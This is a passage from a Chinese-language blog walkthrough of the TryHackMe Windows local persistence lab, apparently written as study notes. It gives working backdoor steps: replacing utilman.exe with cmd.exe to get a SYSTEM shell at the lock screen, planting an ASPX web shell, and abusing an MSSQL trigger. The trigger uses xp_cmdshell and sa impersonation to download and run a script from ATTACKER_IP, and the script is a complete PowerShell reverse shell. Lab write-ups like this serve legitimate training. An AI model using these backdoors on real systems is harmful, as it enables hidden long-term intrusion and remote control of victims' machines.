+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; takeown /f c:\Windows\System32\utilman.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".</span><br><span class="line"></span><br><span class="line">C:\&gt; icacls C:\Windows\System32\utilman.exe /grant Administrator:F</span><br><span class="line">processed file: C:\Windows\System32\utilman.exe</span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line"></span><br><span class="line">C:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</span><br><span class="line">Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了触发您的终端，我们将从开始按钮锁定您的屏幕：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png" alt="lock session"></p>
+<p>最后，继续点击“轻松访问”按钮。由于我们用“cmd.exe”副本替换了“utilman.exe”，我们将获得具有 SYSTEM 权限的命令提示符：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png" alt="backdoored utilman"></p>
+<h1 id="Persisting-Through-Existing-Services"><a href="#Persisting-Through-Existing-Services" class="headerlink" title="Persisting Through Existing Services"></a>Persisting Through Existing Services</h1><p>如果您不想使用 Windows 功能来隐藏后门，您可以随时从可用于为您运行代码的任何现有服务中获益。此任务将研究如何在典型的 Web 服务器设置中植入后门。不过，任何其他您可以在一定程度上控制执行内容的应用程序都应该可以类似地植入后门。可能性是无穷无尽的！</p>
+<p>使用 Web Shell</p>
+<p>在 Web 服务器中实现持久性的常用方法是将 Web Shell 上传到 Web 目录。这很简单，将授予我们 IIS 中配置用户的访问权限，默认情况下为“iis apppool\defaultapppool”。即使这是非特权用户，它也具有特殊的“SeImpersonatePrivilege”，提供了一种使用各种已知漏洞升级到管理员的简便方法。有关如何滥用此权限的更多信息，请参阅 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsprivesc20">Windows Privesc Room</a>。</p>
+<p>首先下载一个 ASP.NET web shell。<a target="_blank" rel="noopener" href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx">此处</a> 提供了一个现成的 web shell，但您可以随意使用任何您喜欢的。将其传输到受害者机器并将其移动到 webroot 中，默认情况下位于“C:\inetpub\wwwroot”目录中：</p>
+<p>Command Prompt</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\&gt; move shell.aspx C:\inetpub\wwwroot\</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意：</strong>根据您创建/传输 <code>shell.aspx</code> 的方式，文件中的权限可能不允许 Web 服务器访问它。如果您在访问 shell 的 URL 时收到“权限被拒绝”错误，只需授予每个人对文件的完全权限即可使其正常工作。您可以使用 <code>icacls shell.aspx /grant Everyone:F</code> 来执行此操作。</p>
+<p>然后我们可以通过指向以下 URL 从 Web 服务器运行命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://10.10.182.21/shell.aspx</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d9845057ebf54a61401ca61c2c268fe8.png" alt="web shell"></p>
+<p>虽然 Web Shell 提供了一种在系统上留下后门的简单方法，但蓝队通常会检查 Web 目录中的文件完整性。对其中文件的任何更改都可能触发警报。</p>
+<p>使用 MSSQL 作为后门</p>
+<p>有几种方法可以在 MSSQL Server 安装中植入后门。现在，我们将研究其中一种滥用触发器的方法。简而言之，MSSQL 中的<strong>触发器</strong>允许您绑定在数据库中发生特定事件时要执行的操作。这些事件的范围可以从用户登录到从给定表中插入、更新或删除数据。对于此任务，我们将为任何插入到 <code>HRDB</code> 数据库的操作创建触发器。</p>
+<p>在创建触发器之前，我们必须首先重新配置数据库上的一些内容。首先，我们需要启用 <code>xp_cmdshell</code> 存储过程。<code>xp_cmdshell</code> 是任何 MSSQL 安装中默认提供的存储过程，允许您直接在系统的控制台中运行命令，但默认情况下处于禁用状态。</p>
+<p>要启用它，让我们打开“Microsoft SQL Server Management Studio 18”，可从开始菜单中找到。当要求进行身份验证时，只需使用<strong>Windows 身份验证</strong>（默认值），您将使用当前 Windows 用户的凭据登录。默认情况下，本地管理员帐户将有权访问所有数据库。</p>
+<p>登录后，单击<strong>新建查询</strong>按钮打开查询编辑器：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png" alt="New SQL query"></p>
+<p>运行以下SQL语句，启用MSSQL配置中的“高级选项”，并继续启用“xp_cmdshell”。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">sp_configure <span class="string">'Show Advanced Options'</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">sp_configure <span class="string">'xp_cmdshell'</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此后，我们必须确保任何访问数据库的网站都可以运行“xp_cmdshell”。默认情况下，只有具有“sysadmin”角色的数据库用户才能执行此操作。由于预计 Web 应用程序将使用受限数据库用户，因此我们可以向所有用户授予权限以模拟“sa”用户，即默认数据库管理员：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">USE master</span><br><span class="line"></span><br><span class="line"><span class="keyword">GRANT</span> IMPERSONATE <span class="keyword">ON</span> LOGIN::sa <span class="keyword">to</span> [Public];</span><br></pre></td></tr></tbody></table></figure>
+
+<p>完成所有这些后，我们终于配置了一个触发器。我们首先切换到“HRDB”数据库：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">USE HRDB</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们的触发器将利用“xp_cmdshell”执行 Powershell，从攻击者控制的 Web 服务器下载并运行“.ps1”文件。触发器将配置为在“HRDB”数据库的“Employees”表中进行“INSERT”时执行：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> [sql_backdoor]</span><br><span class="line"><span class="keyword">ON</span> HRDB.dbo.Employees </span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">INSERT</span> <span class="keyword">AS</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">'sa'</span></span><br><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在后门已经设置好了，让我们在攻击者的机器中创建“evilscript.ps1”，它将包含一个 Powershell 反向 shell：</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">"ATTACKER_IP"</span>,<span class="number">4454</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%{<span class="number">0</span>};</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>){</span><br><span class="line">    <span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );</span><br><span class="line">    <span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">"PS "</span> + (<span class="built_in">pwd</span>).Path + <span class="string">"&gt; "</span>;</span><br><span class="line">    <span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span><br><span class="line">    <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);</span><br><span class="line">    <span class="variable">$stream</span>.Flush()</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们需要打开两个终端来处理此漏洞利用所涉及的连接：</p>
+<ul>
+<li>触发器将执行第一个连接以下载并执行 <code>evilscript.ps1</code>。我们的触发器为此使用端口 8000。</li>
+<li>第二个连接将是端口 4454 上的反向 shell，返回到我们的攻击者机器。</li>
+</ul>
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ python3 -m http.server  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... </span><br></pre></td></tr></tbody></table></figure>
+
+<p>AttackBox</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 4454</span><br><span class="line">Listening on 0.0.0.0 4454</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一切准备就绪后，让我们导航到 <code>http://10.10.182.21/</code> 并将员工插入 Web 应用程序中。由于 Web 应用程序将向数据库发送 INSERT 语句，我们的 TRIGGER 将为我们提供对系统控制台的访问权限。</p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在这个房间里，我们介绍了攻击者在机器上建立持久性的主要方法。你可以说持久性是在系统上植入后门的艺术，同时尽可能长时间不被发现，而不会引起怀疑。我们已经看到了依赖于不同操作系统组件的持久性方法，提供了各种方法来实现对受感染主机的长期访问。</p>
+<p>虽然我们展示了几种技术，但我们只介绍了其中的一小部分。如果您有兴趣学习其他技术，可以使用以下资源：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.hexacorn.com/blog/category/autostart-persistence/">Hexacorn - Windows Persistence</a></li>
+<li>[PayloadsAllTheThings - Windows Persistence](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Windows - Persistence.md) </li>
+<li><a target="_blank" rel="noopener" href="https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/">Oddvar Moe - Windows Persistence Through RunOnceEx </a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/">PowerUpSQL</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/08/01/THMWindowsLocalPersistence/">http://mikannse.space/2024/08/01/THMWindowsLocalPersistence/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/windows/">windows</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/02/THMBypassingUAC/" title="THMBypassingUAC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THMBypassingUAC</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/31/THMWindowsPrivilegeEscalation/" title="THMWindowsPrivilegeEscalation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THMWindowsPrivilegeEscalation</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/02/IceTHM/" title="IceTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-02</div><div class="title">IceTHM</div></div></a></div><div><a href="/2024/08/02/THMBypassingUAC/" title="THMBypassingUAC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-02</div><div class="title">THMBypassingUAC</div></div></a></div><div><a href="/2024/04/28/THMPrintNightmare/" title="THMPrintNightmare"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-28</div><div class="title">THMPrintNightmare</div></div></a></div><div><a href="/2023/09/29/THMWindowsPrivEsc%E6%88%BF%E9%97%B4walkthrough/" title="THMWindowsPrivEsc房间walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-29</div><div class="title">THMWindowsPrivEsc房间walkthrough</div></div></a></div><div><a href="/2024/07/31/THMWindowsPrivilegeEscalation/" title="THMWindowsPrivilegeEscalation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">THMWindowsPrivilegeEscalation</div></div></a></div><div><a href="/2024/04/30/THMZeroLogon/" title="THMZeroLogon"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-30</div><div class="title">THMZeroLogon</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tampering-With-Unprivileged-Accounts"><span class="toc-number">2.</span> <span class="toc-text">Tampering With Unprivileged Accounts</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Backdooring-Files"><span class="toc-number">3.</span> <span class="toc-text">Backdooring Files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Abusing-Services"><span class="toc-number">4.</span> <span class="toc-text">Abusing Services</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.1.</span> <span class="toc-text">创建后门服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">修改现有服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Abusing-Scheduled-Tasks"><span class="toc-number">5.</span> <span class="toc-text">Abusing Scheduled Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.1.</span> <span class="toc-text">任务计划程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E6%88%91%E4%BB%AC%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%B8%8D%E5%8F%AF%E8%A7%81"><span class="toc-number">5.2.</span> <span class="toc-text">使我们的任务不可见</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Logon-Triggered-Persistence"><span class="toc-number">6.</span> <span class="toc-text">Logon Triggered Persistence</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">6.1.</span> <span class="toc-text">启动文件夹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-x2F-RunOnce"><span class="toc-number">6.2.</span> <span class="toc-text">Run &#x2F; RunOnce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Winlogon"><span class="toc-number">6.3.</span> <span class="toc-text">Winlogon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Logon-scripts"><span class="toc-number">6.3.1.</span> <span class="toc-text">Logon scripts</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Backdooring-the-Login-Screen-x2F-RDP"><span class="toc-number">7.</span> <span class="toc-text">Backdooring the Login Screen &#x2F; RDP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Persisting-Through-Existing-Services"><span class="toc-number">8.</span> <span class="toc-text">Persisting Through Existing Services</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">9.</span> <span class="toc-text">Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/08/01/THMWindowsLocalPersistence/'
+    this.page.identifier = '/2024/08/01/THMWindowsLocalPersistence/'
+    this.page.title = 'THMWindowsLocalPersistence'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
